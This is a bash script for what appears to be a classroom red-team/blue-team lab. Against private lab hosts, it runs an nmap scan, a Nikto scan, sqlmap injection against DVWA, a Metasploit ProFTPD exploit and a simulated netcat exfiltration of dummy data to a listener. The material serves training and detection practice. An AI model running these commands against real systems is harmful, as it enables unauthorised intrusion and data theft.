#!/usr/bin/env bash
# =============================================================
# MIT Cyberlab — Red Team Attack Script (Session 5)
# Execute from INSIDE the attacker container:
#   docker exec -it attacker bash /scripts/redteam_script.sh
# Blue Team: monitor Kibana at http://172.20.0.31:5601
# =============================================================

set -euo pipefail

LOG="/results/redteam_activity.log"
mkdir -p /results

log() {
    echo "[$(date -u '+%Y-%m-%d %H:%M:%S UTC')] $*" | tee -a "$LOG"
}

log "========== RED TEAM ENGAGEMENT STARTED =========="
T0=$(date +%s)

# ------------------------------------------------------------------
# Stage 1: Reconnaissance — Nmap SYN scan (T+0 min)
# ------------------------------------------------------------------
log "STAGE 1 — Nmap SYN Scan (T+0:00)"
nmap -sS -T4 172.20.0.10 172.20.0.11 -oN /results/stage1_nmap.txt
log "STAGE 1 COMPLETE — output: /results/stage1_nmap.txt"
sleep 10

# ------------------------------------------------------------------
# Stage 2: Web application scanning — Nikto (T+5 min)
# ------------------------------------------------------------------
log "STAGE 2 — Nikto Web Scan (T+5:00)"
nikto -h http://172.20.0.10 -maxtime 120 -output /results/stage2_nikto.txt -Format txt || true
log "STAGE 2 COMPLETE — output: /results/stage2_nikto.txt"
sleep 10

# ------------------------------------------------------------------
# Stage 3: SQL Injection — sqlmap (T+10 min)
# NOTE: Replace PHPSESSID with a valid session cookie from DVWA
# ------------------------------------------------------------------
log "STAGE 3 — SQL Injection via sqlmap (T+10:00)"
log "ACTION REQUIRED: Set PHPSESSID in script before running Stage 3"
PHPSESSID="${1:-placeholder_replace_me}"
sqlmap \
    -u "http://172.20.0.10/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=${PHPSESSID}; security=low" \
    --dbs --batch \
    --output-dir=/results/sqlmap/ \
    || log "sqlmap completed (may need valid session cookie)"
log "STAGE 3 COMPLETE — output: /results/sqlmap/"
sleep 10

# ------------------------------------------------------------------
# Stage 4: Exploitation — ProFTPD via Metasploit (T+20 min)
# ------------------------------------------------------------------
log "STAGE 4 — Metasploit ProFTPD Exploit (T+20:00)"
msfconsole -q -r /scripts/exploit_script.rc 2>&1 | tee /results/stage4_msf.log || true
log "STAGE 4 COMPLETE — output: /results/stage4_msf.log"
sleep 10

# ------------------------------------------------------------------
# Stage 5: Simulated data exfiltration via netcat (T+30 min)
# ------------------------------------------------------------------
log "STAGE 5 — Simulated Data Exfiltration (T+30:00)"
# Create dummy payload representing exfiltrated data
dd if=/dev/urandom bs=1024 count=100 > /tmp/exfil.tar.gz 2>/dev/null
nc -w 3 172.20.0.5 4444 < /tmp/exfil.tar.gz || true
log "STAGE 5 COMPLETE — exfil simulated to 172.20.0.5:4444"

T_END=$(date +%s)
DURATION=$(( T_END - T0 ))
log "========== RED TEAM ENGAGEMENT COMPLETE =========="
log "Total attack duration: ${DURATION} seconds ($(( DURATION / 60 )) minutes)"
log "Activity log saved to: $LOG"
